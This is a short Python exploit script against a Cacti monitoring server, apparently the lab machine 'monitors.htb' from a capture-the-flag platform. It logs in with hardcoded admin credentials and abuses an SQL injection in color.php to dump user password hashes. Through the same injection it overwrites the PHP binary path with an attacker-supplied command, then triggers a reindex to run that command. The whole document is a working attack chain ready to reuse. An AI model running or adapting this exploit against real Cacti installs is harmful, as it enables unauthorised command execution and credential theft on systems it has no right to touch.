#!/usr/bin/env python3

import re
import requests
import sys
import urllib.parse


payload = urllib.parse.quote(sys.argv[1]) + ';'

sess = requests.Session()
sess.proxies.update({'http': 'http://127.0.0.1:8080'})

# get CSRF
resp = sess.get("http://cacti-admin.monitors.htb/cacti/index.php")
csrf = re.search(r"csrfMagicToken='(.*)'", resp.text).group(1)
print(f"Got CSRF: {csrf}")

# login
resp = sess.post("http://cacti-admin.monitors.htb/cacti/index.php",
        data = {
            '__csrf_magic':   csrf,
            'action':         'login',
            'login_username': 'admin',
            'login_password': 'BestAdministrator@2020!',
            })

print(f"[+] Logged in with cookie: {sess.cookies['Cacti']}")

# upload command
resp = sess.get(f"http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{payload}'+where+name='path_php_binary';--+-")

# trigger
resp = sess.get("http://cacti-admin.monitors.htb/cacti/host.php?action=reindex")